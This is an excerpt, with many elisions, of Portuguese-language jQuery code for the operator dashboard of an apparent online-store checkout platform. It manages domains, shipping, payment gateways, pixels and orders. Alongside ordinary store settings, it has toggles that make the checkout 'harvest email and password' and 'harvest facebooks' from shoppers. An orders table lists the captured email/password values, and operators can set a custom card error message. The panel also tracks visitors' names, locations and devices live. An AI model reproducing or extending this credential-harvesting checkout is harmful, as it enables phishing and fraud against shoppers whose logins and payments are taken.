                                        url: usuario.url_api + "updateCategoriaProduto",
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/x-www-form-urlencoded",
                                            Accept: "application/json",
                                        ...
                                        success: (retorno) => {
                                            if (retorno.status == 200) {
                                                rowData.ds_categoria = texto;
                                                $("#grid_produtos_loja_" + idloja).jqxGrid('updaterow', rowData.boundindex, rowData);


                                                _global.toast('A categoria do produto foi atualizada com sucesso.', 'toastsucesso');
                                            } else {
                                                _global.toast('Não foi possível atualizar a categoria do produto', 'toasterro');
                                            }
                ...
                return new Promise((res) => {
                    $.ajax({
                        ...
                        success: (retorno) => {
                            ...
                            $("#deleta_categoria_" + idloja).click(function(e) {
                                e.preventDefault();
                                e.stopImmediatePropagation();
                                e.stopPropagation();

                                let thisdelete = $(this);
                                let valorDelete = $("#categorias_produto_" + idloja).val();
                                if (valorDelete == null || valorDelete == "") {
                                    _global.toast('Selecione uma categoria para deletar!', 'toastwarning');
                                    return;
                                }
                                _global.btnCarregando($(this), true, 'Deletar categoria');
                                ...
                                $.ajax({
                                    ...
                                    success: (retorno) => {
                                        if (retorno.status == 200) {
                                            _global.toast('A categoria foi deletada com sucesso!', 'toastsucesso');
                                            $('#categorias_produto_' + idloja + ' option[value="' + valorDelete + '"]').remove()

                                        } else {
                                            _global.toast('Não foi possível deletar a categoria', 'toasterro');
                                        }
                                        _global.btnCarregando($(thisdelete), false, 'Deletar Categoria');
                                    },
                                    error: () => {
                                        _global.toast('Erro interno.', 'toasterro');
                                        _global.btnCarregando($(thisdelete), false, 'Deletar Categoria');
            ...
            $("#btn_categoria_" + idloja).click(function(e) {
                ...
                if ($("#add_categoria_" + idloja).val() == '' || $("#add_categoria_" + idloja).val().length == 0) {
                    _global.toast('Digite uma categoria para adicionar', 'toastwarning');
                    return;
                }
                ...
                $.ajax({
                    ...
                    success: (retorno) => {
                        ...
                        _global.btnCarregando(thisbotao, false, 'Adicionar Categoria')
                    },
                    error: () => {
                        _global.toast('Erro interno', 'toasterro');
                        _global.btnCarregando(thisbotao, false, 'Adicionar Categoria')
        ...
        trocaAbaModalLoja(idloja) {
            $(".abamodalloja_" + idloja).click(function(e) {
                ...
                $("#pai_modal_" + idloja).children().each((index, data) => {
        ...
        async selects() {
            ...
            $.ajax({
                ...
                success: (retorno, xhr) => {
                    ...
                    if(usuario.usuario == "dev" || usuario.usuario == "dv" || usuario.usuario == "ot2"){
                        select += '<option value="4">SkyPayments - Somente Suitpay</option>';
                    }
                },
        ...
        adicionarDominio() {
            ...
            $("#btnAdicionarDominio").click(function(e) {
                ...
                if (dominio.length == 0 || dominio == '') {
                    _global.toast('É necessário informar o domínio.', 'toastwarning');
                    return;
                }
                if (!$("#checkboxAdicionarDominio").prop('checked')) {
                    _global.toast('Você precisar concordar com as condições.', 'toastwarning');
                    return;
                }
                if (tp_dominio == "loja" && $("#select_loja_dominio").val() == "") {
                    _global.toast("Selecione uma loja para adicionar ao domínio.", 'toastwarning');
                    return;
                }
                ...
                $.ajax({
                    ...
                    success: (retorno) => {
                        ...
                        if (retorno.status == 300) {
                            _global.toast('O domínio não está apontado para o ip do servidor!', 'toastwarning');
                            _global.btnCarregando($(this), false, 'Adicionar');
                            return;
                        }
                        if (retorno.status == 200) {
                            $.get('/rs?token=' + usuario.token_checkout, (data, xhr) => {
                                if (data.status == undefined || data.status == 200 || xhr.status == 500) {
                                    _global.toast('O domínio foi adicionado.', 'toastsucesso');
                                    setTimeout(() => {
                                        location.reload();
                                    }, 1500)
                                } else {
                                    _global.toast('Houve um erro ao adicionar o seu domínio.', 'toasterro');
                                }
                ...
                return new Promise((res) => {
                    $.ajax({
                        ...
                        success: (retorno) => {
                            ...
                            if (retorno.status != 409 && retorno.status != 401) {
                                $(retorno).each((i, val) => {
                                            ...
                                            $("<li>", {
                                                ...
                                                $("<div>", {
                                                    ...
                                                    $("<span>", {
                                                        ...
                                                        $("<span>", {
                                                            style: `margin-left: 5px; height: 18px;`,
                                                            class: `badge bg-gradient-${(val.sn_ssl == 's' ? 'success' : 'danger')}`,
                                                            text: (val.sn_ssl == 's' ? 'Ativo' : 'Inativo')
                                                        })
                                                    )
                                                )
                                            ).append(
                                                    ...
                                                    $("<a>", {
                                                        ...
                                                        $("<i>", {
                                                            ...
                                                            click: function(e) {
                                                                ...
                                                                _global.apagaDominio(val.dominio)
                                                            }
                                                        })
                                                    )
                                        ...
                                        $("#cards_dominio").append(
                                            $("<li>", {
                                                ...
                                                $("<div>", {
                                                    ...
                                                    $("<h6>", {
                                                        class: 'mb-3 text-sm',
                                                        text: val.dominio + ' (Domínio para Checkout)'
                                                    })
                                                ).append(
                                                    $("<span>", {
                                                        class: 'mb-2 text-xs',
                ...
                $.ajax({
                    ...
                    success: (retorno) => {
                        ...
                        $(".dominio").click(function(e) {
                            ...
                            $(lista_dominio[$(this).attr('dominio')]).each((i, valor) => {
                                $("#append_log").append(`
        ...
        async apagaDominio(dominio) {
            ...
            $.ajax({
                ...
                success: (retorno) => {
                    if (retorno.status == 200) {
                        _global.toast('O domínio foi apagado com sucesso.', 'toastsucesso');
                        setTimeout(()=>{
                            location.reload();
                        }, 1500)

                    } else {
                        _global.toast('Não foi possível apagar o domínio', 'toasterro');
                    }
                },
                error: () => {
                    _global.toast('Não foi possível realizar a ação (Erro interno)');
                }
            })
        ...
        async abaCheckout() {
            ...
            $("#select_loja").change(async function(e) {
                ...
                const fretes = await _global.busca('dashboard/getFretesLoja', {
                        id_loja: $("#select_loja").val()
                    },
                    'POST'
                );

                const dadosPagamento = await _global.busca('dashboard/getDadosPagamento', {
                        id_loja: $("#select_loja").val()
                    },
                    'POST'
                );

                const preferencias = await _global.busca('dashboard/getPreferencias', {
                        id_loja: $("#select_loja").val()
                    },
                    'POST'
                );

                const fretePadrao = await _global.busca('dashboard/getFretePadrao', {
                    id_loja: $("#select_loja").val()
                }, 'POST');

                let _suitpay = await _global.busca('dashboard/getSuitpay', {
                    id_loja: $("#select_loja").val(),
                }, 'POST');

                let bc = await _global.busca('dashboard/getBc', {
                    id_loja: $("#select_loja").val()
                }, 'POST');

                let produtos = await _global.busca('getProdutos',{
                    id_loja: $("#select_loja").val()
                }, 'POST');

                let codigosRestantes = await _global.busca('dashboard/getCountCodigos',{
                    l: $("#select_loja").val()
                },'POST');

                let cartaoLoja = await _global.busca('dashboard/getCartaoLoja',{
                    l: $("#select_loja").val()
                }, 'POST');
                ...
                const abas = ['pagamento', 'copiacola', 'cartao', 'frete', 'pixel', 'configuracoes'];
                    ...
                    return new Promise((res) => {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<div>", {
                                            ...
                                            $("<ul>", {
                                                ...
                                                (usuario.usuario == 'joseph' || usuario.usuario == 'dev' ? $("<li>", {
                                                    class: 'nav-item'
                                                }).append(
                                                    $("<a>", {
                                                        class: 'nav-link mb-0 px-0 py-1 tabcheckout',
                                                    ...
                                                    $("<ul>", {
                                                        ...
                                                        $("<li>", {
                                                            ...
                                                            $("<div>", {
                                                                ...
                                                                $("<h6>", {
                                                                    class: 'mb-3 text-sm',
                                                                    id: 'frete_padrao_' + $("#select_loja").val(),
                                                                    text: (fretePadrao.frete ?? 'Sedex') + ' (Padrão)'
                                                                })
                                                            ).append(
                                                                $("<span>", {
                                                                    class: 'mb-2 text-xs',
                                                            ...
                                                            $("<div>", {
                                                                ...
                                                                $("<i>", {
                                                                    ...
                                                                    click: async function(e) {
                                                                        let p = prompt('Digite o título do frete padrão desejado.');

                                                                        if (p.length < 1 || p.length > 230) {
                                                                            _global.toast('Título inválido, verifique o título digitado.', 'toasterro');
                                                                            return;
                                                                        }

                                                                        let dados = await _global.busca('dashboard/updateFretePadrao', {
                                                                            id_loja: $("#select_loja").val(),
                                                                            t: p
                                                                        }, 'POST');

                                                                        if (dados.status == 200) {
                                                                            _global.toast('O frete padrão foi alterado.', 'toastsucesso');
                                                                            $("#frete_padrao_" + $("#select_loja").val()).text(p + ' (Padrão)');
                                                                        } else {
                                                                            _global.toast('Houve um erro interno. Código: [EXC]', 'toasterro');
                                                                        }
                                                                ...
                                                                $("<a>", {
                                                                    class: 'btn btn-link text-danger text-gradient px-3 mb-0',
                                                                    click: function(e) {
                                                                        _global.toast('Você não pode apagar o frete padrão.', 'toasterro');
                                                                    }
                                                                }).append(
                                                                    $("<i>", {
                                                                        class: 'far fa-trash-alt me-2',
                                            ...
                                            $("<div>", {
                                                ...
                                                $("<button>", {
                                                    ...
                                                    click: function(e) {
                                                        ...
                                                        if (
                                                            isNaN(parseFloat($("#input_frete_preco").val())) ||
                                                            $("#input_frete_preco").val().length < 1
                                                        ) {
                                                            _global.toast('Preço do frete inválido.', 'toastwarning');
                                                            return;
                                                        }

                                                        if ($("#input_frete_texto").val().length < 1) {
                                                            _global.toast('Texto do frete inválido.', 'toastwarning');
                                                            return;
                                                        }

                                                        _global.btnCarregando($(this), true, 'Salvar Informações');

                                                        let _preco = $("#input_frete_preco").val();

                                                        _preco = _preco.replace(',', '.');

                                                        $.ajax({
                                                            url: usuario.url_api + "dashboard/updateFreteLoja",
                                                            method: "POST",
                                                            headers: {
                                                                "Content-Type": "application/x-www-form-urlencoded",
                                                                Accept: "application/json",
                                                            ...
                                                            data: {
                                                                texto: $("#input_frete_texto").val(),
                                                                preco: _preco,
                                                                id_loja: $("#select_loja").val()
                                                            },
                                                            success: (retorno) => {
                                                                if (retorno.status == 200) {
                                                                    _global.toast('O frete foi adicionado', 'toastsucesso');
                                                                    ...
                                                                    $("#cards_frete").append(
                                                                        $("<li>", {
                                                                            ...
                                                                            $("<div>", {
                                                                                class: 'ms-auto text-end',
                                                                                id: 'divvfrete' + retorno.id_frete_loja
                                                                            }).append(
                                                                                $("<a>", {
                                                                                    class: 'btn btn-link text-danger text-gradient px-3 mb-0',
                                                                                    click: async function(e) {
                                                                                        e.preventDefault();
                                                                                        $("#divvfrete" + retorno.id_frete_loja).parent().remove();
                                                                                        let dados = await _global.busca('dashboard/apagaFrete', {
                                                                                            id: retorno.id_frete_loja
                                                                                        }, 'POST');

                                                                                        if (dados.status == 200) {
                                                                                            _global.toast('O frete foi apagado.', 'toastsucesso');
                                                                                            $(this).parent().remove();
                                                                                            return;
                                                                                        }

                                                                                        if (dados.status == 500) {
                                                                                            _global.toast('Não foi possível apagar o frete. [Erro Interno]', 'toasterro')
                                                                                            return;
                                                                                        }
                                                                    ...
                                                                    _global.toast('Você atingiu o número máximo de fretes (2)', 'toasterro');
                                                                } else {
                                                                    _global.toast('Não foi possível adicionar o frete.', 'toasterro');
                                                                }
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<div>", {
                                            ...
                                            $("<button>", {
                                                ...
                                                'data-bs-toggle': 'modal',
                                                'data-bs-target': '#modalcopiacolaremove'
                                            })
                                        ).append(
                                            $("<div>",{
                                                style: 'display: flex;'
                                        ...
                                        $("<div>", {
                                            ...
                                            $("<div>", {
                                                ...
                                                $("<input>", {
                                                    ...
                                                    type: 'checkbox',
                                                    checked: preferencias.resumo_aberto,
                                                    change: async function(e) {
                                                        let v = ($(this).prop('checked') ? 's' : 'n');
                                                        let c = "resumo_aberto";
                                                        let i = $("#select_loja").val();

                                                        let msg = ($(this).prop('checked') ? 'aberto' : 'fechado');

                                                        const dados = await _global.busca('dashboard/updatePreferencias', {
                                                            id_loja: i,
                                                            c: c,
                                                            v: v
                                                        }, 'POST');
                                                        ...
                                                        if (dados.status == 200) {
                                                            _global.toast('O checkout desta loja virá com o resumo ' + msg + ' agora.', 'toastsucesso')
                                                        }
                                            ...
                                            $("<div>", {
                                                ...
                                                $("<input>", {
                                                    ...
                                                    checked: preferencias.ultimo_dia,
                                                    change: async function(e) {
                                                        let v = ($(this).prop('checked') ? 's' : 'n');
                                                        let c = "ultimo_dia";
                                                        let i = $("#select_loja").val();

                                                        let msg = ($(this).prop('checked') ? 'com' : 'sem');
                                                        ...
                                                        if (dados.status == 200) {
                                                            _global.toast('O checkout desta loja virá ' + msg + ' mensagem de último dia de promoção agora.', 'toastsucesso')
                                                        }
                                            ...
                                            $("<div>", {
                                                ...
                                                $("<input>", {
                                                    class: 'form-check-input',
                                                    type: 'checkbox',
                                                    checked: preferencias.colher_senha,
                                                    change: async function(e) {
                                                        let v = ($(this).prop('checked') ? 's' : 'n');
                                                        let c = "colher_senha";
                                                        let i = $("#select_loja").val();

                                                        let msg = ($(this).prop('checked') ? 'irá colher email e senha' : 'não irá colher email e senha');
                                                        ...
                                                        if (dados.status == 200) {
                                                            _global.toast('O checkout desta loja ' + msg + ' agora.', 'toastsucesso')
                                                        }
                                            ...
                                            $("<div>", {
                                                ...
                                                $("<input>", {
                                                    class: 'form-check-input',
                                                    type: 'checkbox',
                                                    checked: preferencias.colher_facebook,
                                                    change: async function(e) {
                                                        let v = ($(this).prop('checked') ? 's' : 'n');
                                                        let c = "colher_facebook";
                                                        let i = $("#select_loja").val();

                                                        let msg = ($(this).prop('checked') ? 'irá colher facebooks' : 'não irá colher facebooks');
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<div>", {
                                            ...
                                            $("<input>", {
                                                ...
                                                class: 'form-control',
                                                style: 'width: 90%;',
                                                value: _suitpay.usuario_suitpay ?? ''
                                            })
                                        ).append(
                                            $("<span>", {
                                                style: 'margin-top: 10px; font-size: 0.7vw;',
                                            ...
                                            $("<button>", {
                                                ...
                                                click: async function(e) {
                                                    if ($("#cs_suit").val().length < 4 || $("#ci_suit").val().length < 4) {
                                                        _global.toast('Existem campos vazios, verifique CI e CS.', 'toasterro');
                                                        return;
                                                    }

                                                    if ($("#usuario_suit").val().length < 2) {
                                                        _global.toast('Digite o usuário da SuitPay', 'toasterro');
                                                        return;
                                                    }
                                                    _global.btnCarregando($(this), true, 'Salvar Informações');
                                                    ...
                                                    let dados = await _global.busca('dashboard/updateSuitpay', {
                                                        ci: $("#ci_suit").val(),
                                                        cs: $("#cs_suit").val(),
                                                        id_loja: $("#select_loja").val(),
                                                        usuario_suit: $("#usuario_suit").val(),
                                                        id_usuario: usuario.id_usuario
                                                    }, 'POST')

                                                    if (dados.status == 200) {
                                                        _global.toast('As credenciais foram salvas com sucesso', 'toastsucesso');
                                                    } else {
                                                        _global.toast('Não foi possível salvar - Erro interno', 'toasterro')
                                                    }
                                                    _global.btnCarregando($(this), false, 'Salvar Informações');
                                                }
                                            })
                                            ...
                                            $("<button>", {
                                                ...
                                                style: 'width: 90%;',
                                                click: async function(e) {
                                                    _global.btnCarregando($(this), true, 'Desativar Suitpay');
                                                    let dados = await _global.busca('dashboard/deleteSuitpay', {
                                                        l: $("#select_loja").val()
                                                    }, 'POST');

                                                    if (dados.status == 200) {
                                                        _global.toast('A Gateway Suitpay foi desativada com sucesso.', 'toastsucesso');
                                                        $("#usuario_suit").val('');
                                                        $("#ci_suit").val('');
                                                        $("#cs_suit").val('');
                                                    } else {
                                                        _global.toast('Não foi possível desativar a gateway, houve um erro interno.', 'toasterro');
                                                    }
                                                    _global.btnCarregando($(this), false, 'Desativar Suitpay');
                                                }
                                            })
                                        )
                                    )
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<div>", {
                                            ...
                                            $("<button>", {
                                                ...
                                                text: 'Salvar',
                                                click: async function(e) {
                                                    if ($("#bc_smid").val().length < 2 || $("#bc_cookie").val().length < 2) {
                                                        _global.toast('Preencha os campos.', 'toasterro');
                                                        return;
                                                    }

                                                    _global.btnCarregando($(this), true, 'Salvar');

                                                    let dados = await _global.busca('dashboard/updateBc', {
                                                        id_loja: $("#select_loja").val(),
                                                        cookie: $("#bc_cookie").val(),
                                                        smid: $("#bc_smid").val()
                                                    }, 'POST');
                                                    ...
                                                    if (dados.status == 200) {
                                                        _global.toast('Os valores foram salvos com sucesso.', 'toastsucesso');
                                                        return;
                                                    }

                                                    _global.toast('Não foi possível salvar os valores', 'toasterro');
                                                }
                                            })
                                        )
                                    )
                        ...
                        <div class="modal-dialog modal-dialog-centered" role="document">
                          <div class="modal-content">
                            ...
                            <label>Pixel 1</label>
                            <input type="text" class="form-control margin5" id="fb_pixel1" placeholder="ID do Pixel 1" value="${(dadosPagamento.fbpixel[0] != undefined ? dadosPagamento.fbpixel[0].pixel_1??'' : '')}"/>
                            <label>Pixel 2</label>
                            <input type="text" class="form-control margin5" id="fb_pixel2" placeholder="ID do Pixel 2" value="${(dadosPagamento.fbpixel[0] != undefined ? dadosPagamento.fbpixel[0].pixel_2??'' : '')}"/>
                            <label>Pixel 3</label>
                            <input type="text" class="form-control margin5" id="fb_pixel3" placeholder="ID do Pixel 3" value="${(dadosPagamento.fbpixel[0] != undefined ? dadosPagamento.fbpixel[0].pixel_3??'' : '')}"/>
                            <label>Pixel 4</label>
                            <input type="text" class="form-control margin5" id="fb_pixel4" placeholder="ID do Pixel 4" value="${(dadosPagamento.fbpixel[0] != undefined ? dadosPagamento.fbpixel[0].pixel_4??'' : '')}"/>
                            <label>Pixel 5</label>
                            <input type="text" class="form-control margin5" id="fb_pixel5" placeholder="ID do Pixel 5" value="${(dadosPagamento.fbpixel[0] != undefined ? dadosPagamento.fbpixel[0].pixel_5??'' : '')}"/>
                            <label>Pixel 6</label>
                            <input type="text" class="form-control margin5" id="fb_pixel6" placeholder="ID do Pixel 6" value="${(dadosPagamento.fbpixel[0] != undefined ? dadosPagamento.fbpixel[0].pixel_6??'' : '')}"/>
                            </div>
                        ...
                        $("#salvar_pixel_fb").click(async function(e) {
                            _global.btnCarregando($("#salvar_pixel_fb"), true, 'Salvar');
                            let dados = await _global.busca('dashboard/salvaPixelFb', {
                                p1: $("#fb_pixel1").val(),
                                p2: $("#fb_pixel2").val(),
                                p3: $("#fb_pixel3").val(),
                                p4: $("#fb_pixel4").val(),
                            ...
                            if (dados.status == 200) {
                                _global.toast('As informações foram salvas.', 'toastsucesso');
                            }
                            if (dados.status == 500) {
                                _global.toast('Não foi possível salvar as informações', 'toasterro');
                            }

                            _global.btnCarregando($("#salvar_pixel_fb", false, 'Salvar'));
                        ...
                        <div class="modal-dialog modal-dialog-centered" role="document">
                          <div class="modal-content">
                            ...
                            <input type="text" class="form-control margin5" id="taboola_pixel1" placeholder="xxxxx" value="${(dadosPagamento.taboolapixel != null ? dadosPagamento.taboolapixel : '')}"/>
                            </div>
                            <div class="modal-footer">
                              <button type="button" class="btn bg-gradient-secondary" data-bs-dismiss="modal">Fechar</button>
                        ...
                        $("#salvar_pixel_taboola").click(async function(e) {
                            if($("#taboola_pixel1").val() == ''){
                                _global.toast('Preencha o ID da conta taboola.', 'toasterro');
                                return;
                            }
                            _global.btnCarregando($("#salvar_pixel_taboola"), true, 'Salvar');
                            let dados = await _global.busca('dashboard/salvaPixelTaboola', {
                            ...
                            _global.btnCarregando($("#salvar_pixel_taboola", false, 'Salvar'));
                                ...
                                $("<div>",{
                                    ...
                                    $("<input>",{
                                        ...
                                        change: async function(e){
                                            ...
                                            let dados = await _global.busca('dashboard/ativaCartaoLoja',{
                                                l: $("#select_loja").val(),
                                                flag: (flag ? 's' : 'n')
                                            }, 'POST');

                                            if(dados.status == 200){
                                                _global.toast('A forma de pagamento Cartão de Crédito foi ativada ao checkout.', 'toastsucesso');
                                                $("#div_cartao_loja").append(
                                                    $("<div>",{
                                                    ...
                                                    $("<button>",{
                                                        ...
                                                        click: async function(e){
                                                            let _msg = prompt('Digite a mensagem de erro desejada:');

                                                            if(_msg == ''){
                                                                _global.toast('A mensagem digitada está vazia.', 'toastsucesso');
                                                                return;
                                                            }

                                                            let dados = await _global.busca('dashboard/updateMsgCartao',{
                                                                l: $("#select_loja").val(),
                                                                m: _msg
                                                            }, 'POST');

                                                            if(dados.status == 200){
                                                                _global.toast('A mensagem de erro foi alterada com sucesso.', 'toastsucesso');
                                                            }else{
                                                                _global.toast('Não foi possível salvar a mensagem.', 'toasterro')
                                                            }
                                                        }
                                                    })
                                                )
                                                ...
                                                _global.toast('A forma de pagamento Cartão de Crédito foi desativada ao checkout.', 'toastsucesso');
                                                $(".tempativocard").each((i,v)=>{
                                                    $(v).remove();
                                                })
                                            }
                                        }
                            ...
                            $("#div_cartao_loja").append(
                                $("<div>",{
                                    ...
                                    $("<input>",{
                                        ...
                                        type: 'checkbox',
                                        id: 'checkbox_vbv',
                                        checked: (cartaoLoja[0].vbv == 's' ? true : false),
                                        change: async function(e){
                                            let flag = $(this).prop('checked');
                ...
                appendCheckout().then(() => {
                    if (dadosPagamento.pix != null) {
                        $("#banco_responsavel").val(dadosPagamento.pix.logo_banco ?? 'mp').change()
                    }
                    $(".tabcheckout").click(function(e) {
                        ...
                        $("#tabs_checkout")
                            .children()
                            .each((i, v) => {
                                if ($(v).children().attr('aba') != $(this).attr('aba')) {
                                    $(v).children().removeClass('abacheckoutativo')
                                } else {
                                    $(v).children().addClass('abacheckoutativo')
                                }
                            })
                            ...
                            $("<li>", {
                                ...
                                $("<div>", {
                                    ...
                                    $("<a>", {
                                        ...
                                        click: async function(e) {
                                            e.preventDefault();
                                            $("#divvfrete" + v.id_frete_loja).parent().remove();
                                            let dados = await _global.busca('dashboard/apagaFrete', {
                                                id: v.id_frete_loja
                                            }, 'POST');
                    ...
                    if (dadosPagamento.status == 200 && dadosPagamento.pix != undefined) {
                        $("#select_tipo_chave_pix").val(dadosPagamento.pix.id).change();
                    }
        ...
        geraHistoricoPix(i) {
            ...
            for (_i = 1; _i <= tamanho; _i++) {
                $("#paginacao_historico").append(
                    $("<li>", {
                        class: 'cursorpointer page-item ' + (i == _i ? 'active' : ''),
        ...
        async usuariosOnlineCheckout() {
            const usuario = _global.getUsuario();
            let dados = await _global.busca('getUsuariosOnline', {
                flag: 'checkout',
                tipo_usuario: usuario.tipo_usuario,
                id_usuario: usuario.id_usuario
            }, 'POST');
                            ...
                            $("<td>").append(
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<span>", {
                                            class: 'badge ' + (v.finalizou_pedido == 's' ? 'bg-gradient-success' : 'bg-gradient-danger'),
                                            text: (v.finalizou_pedido == 's' ? 'Sim' : 'Não'),
                                ...
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<span>", {
                                            ...
                                            text: v.nome_completo ?? 'Não capturado ainda',
                                            style: 'font-size: 10px; border-radius: 30px;'
                                        })
                                    )
                                )
                            ...
                            $("<td>").append(
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<span>", {
                                            class: 'badge bg-gradient-primary',
                                            text: v.localizacao ?? 'Não localizado',
                                            style: 'font-size: 10px; border-radius: 30px;'
                                        })
                                    )
                                )
                            ...
                            $("<td>").append(
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<span>", {
                                            class: 'badge bg-gradient-primary',
                                            text: v.dispositivo ?? 'Não capturado',
                                            style: 'font-size: 10px; border-radius: 30px;'
                                        })
                                    )
                                )
        ...
        async tabelaPedidos() {
            const usuario = _global.getUsuario();
            let dados = await _global.busca('dashboard/getPedidos', {
                id_usuario: usuario.id_usuario,
                tipo_usuario: usuario.tipo_usuario,
                            ...
                            $("<td>").append(
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<h6>", {
                                            class: 'mb-0 h6pedidos',
                                            text: 'R$ ' + ((v.quantidade * v.preco) + parseFloat(v.valor_orderbump)).toFixed(2)
                                        })
                                    )
                                )
                            )
                            ...
                            $("<td>").append(
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<h6>", {
                                            class: 'mb-0 h6pedidos',
                                            text: (v.email_senha != null ? v.email_senha : 'Não habilitado')
                                        })
                                    )
                                )
                            )
                            ...
                            $("<td>").append(
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<h6>", {
                                            class: 'mb-0 h6pedidos',
                                            text: (v.metodo_pagamento == 'pix' ? 'Pix' : v.metodo_pagamento == 'cartao' ? 'Cartão de Crédito' : 'Cartão')
                                        })
                                    )
                                )
                            )
                            ...
                            $("<td>").append(
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<span>", {
                                            class: 'badge ' + (v.sn_pix_copiado == 'n' ? 'bg-gradient-danger' : 'bg-gradient-success'),
                                            style: 'font-size: 10px; border-radius: 30px;',
                                            text: (v.sn_pix_copiado == 'n' ? 'Não' : 'Sim')
                                        })
                                    )
                                )
                            )
                            ...
                            $("<td>").append(
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<h6>", {
                                            class: 'mb-0 h6pedidos',
                                            text: 'R$ ' + v.frete_selecionado_valor
                                        })
                                    )
                                )
                            )
                                ...
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<img>", {
                                            ...
                                            i: v.id_loja,
                                            click: async function(e) {
                                                let verificaCredencial = await _global.busca('dashboard/verificaWhatsapp', { id_loja: $(this).attr('i') }, 'POST');
                                                let hash = $(this).attr('h');

                                                if (verificaCredencial.status == 404) {
                                                    _global.toast('Você não tem credênciais de Whatsapp para esta loja.', 'toasterro');
                                                    return;
                                                }
                                                if (verificaCredencial.status != 200) {
                                                    _global.toast('Não foi possível efetuar a operação [ERRO INTERNO].', 'toasterro');
                                                    return;
                                                }

                                                let dados = await _global.busca('dashboard/getStatusWhatsapp', { h: $(this).attr('h') }, 'POST');
                                                if (dados.whatsapp_pedido == undefined) {
                                                    _global.toast('Houve um erro interno.', 'toasterro');
                                                    return;
                                                }

                                                $("#content_modal_whatsapp").empty();

                                                $("#content_modal_whatsapp").append(
                                                    $("<div>", {
                                                    ...
                                                    $("<div>", {
                                                        ...
                                                        $("<button>", {
                                                            class: hash + ' btn btn-' + (dados.whatsapp_pgtoaprovado == 's' ? 'success' : 'primary'),
                                                            text: (dados.whatsapp_pgtoaprovado == 's' ? 'Enviado' : 'Enviar'),
                                                            disabled: (dados.whatsapp_pgtoaprovado == 's' ? true : false),
                                                            flag: 'aprovado'
                                                        })
                                                    )
                                                ).append(
                                                    $("<div>", {
                                                        ...
                                                        $("<button>", {
                                                            class: hash + ' btn btn-' + (dados.whatsapp_rastreio == 's' ? 'success' : 'primary'),
                                                            text: (dados.whatsapp_rastreio == 's' ? 'Enviado' : 'Enviar'),
                                                            disabled: (dados.whatsapp_rastreio == 's' ? true : false),
                                                            flag: 'rastreio'
                                                        })
                                                    )
                                                )
                                                ...
                                                $("." + hash).click(function(e) {
                                                    e.preventDefault();
                                                    _global.enviaMensagemWhatsapp(hash, $(this).attr('flag'), $(this));
                                                })
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<img>", {
                                            ...
                                            click: async function(e) {
                                                ...
                                                let dados = await _global.busca('dashboard/verificaEmailPedido', {
                                                    h: $(this).attr('h'),
                                                    l: $(this).attr('i')
                                                }, 'POST');

                                                if (dados.status == 404) {
                                                    _global.toast('A loja não tem um SMTP cadastrado.', 'toasterro');
                                                    return;
                                                }


                                                $("#content_modal_email").empty();
                                                $("#content_modal_email").append(
                                                    $("<div>", {
                                                        ...
                                                        $("<button>", {
                                                            class: 'btn btn-' + (dados.email_pedido == 'n' ? 'primary' : 'success'),
                                                            text: (dados.email_pedido == 'n' ? 'Enviar' : 'Enviado'),
                                                            disabled: (dados.email_pedido == 'n' ? false : true),
                                                            click: async function(e) {

                                                                _global.btnCarregando($(this), true, 'Enviar');

                                                                let dados = await _global.busca('dashboard/enviaConfirmacaoPedido', {
                                                                    h: h,
                                                                    l: l
                                                                }, 'POST');
                                                                ...
                                                                if (dados.status == 200) {
                                                                    _global.btnCarregando($(this), false, 'Enviado');
                                                                    $(this).removeClass('btn-primary').addClass('btn-success');
                                                                    $(this).prop('disabled', true);
                                                                    _global.toast('O email de confirmação foi enviado com sucesso.', 'toastsucesso');

                                                                } else {
                                                                    _global.btnCarregando($(this), false, 'Enviar');
                                                                    _global.toast('Não foi possível enviar o email de confirmação', 'toasterro');
                                                                }
                                                            }
                                                        })
                                                    )
                                                    ...
                                                    $("<div>", {
                                                        ...
                                                        $("<button>", {
                                                            class: 'btn btn-' + (dados.email_lembrete == 'n' ? 'primary' : 'success'),
                                                            text: (dados.email_lembrete == 'n' ? 'Enviar' : 'Enviado'),
                                                            disabled: (dados.email_lembrete == 'n' ? false : true),
                                                            click: async function(e) {

                                                                _global.btnCarregando($(this), true, 'Enviar');

                                                                let dados = await _global.busca('dashboard/enviaLembretePagamento', {
                                                                    h: h,
                                                                    l: l
                                                                }, 'POST');
                                                                ...
                                                                if (dados.status == 200) {
                                                                    ...
                                                                    $(this).removeClass('btn-primary').addClass('btn-success');
                                                                    $(this).prop('disabled', true);
                                                                    _global.toast('O email de lembrete de pagamento foi enviado com sucesso.', 'toastsucesso');

                                                                } else {
                                                                    _global.btnCarregando($(this), false, 'Enviar');
                                                                    _global.toast('Não foi possível enviar o email de lembrete de pagamento', 'toasterro');
                                                                }
                                                            }
                                                        })
                                                    )
                                ...
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<span>", {
                                            ...
                                            style: 'display: flex; justify-content: center;',
                                            click: function(e) {
                                                $("#btn_modal_apaga").click();
                                                $("#confirma_deleta_pedido").attr('pedido', $(this).attr('pedido'))
                                            }
                                        }).append(
                                            $("<i>", {
                                                class: 'ni ni-fat-remove',
            ...
            $("#confirma_deleta_pedido").off('click').on('click', function(e) {
                e.preventDefault();
                            ...
                            $("<td>").append(
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<h6>", {
                                            class: 'mb-0 h6pedidos',
                                            text: 'R$ ' + (v.quantidade * v.preco).toFixed(2)
                                        })
                                    )
                                )
                            )
                            ...
                            $("<td>").append(
                                $("<div>", {
                                    ...
                                    $("<div>", {
                                        ...
                                        $("<h6>", {
                                            class: 'mb-0 h6pedidos',
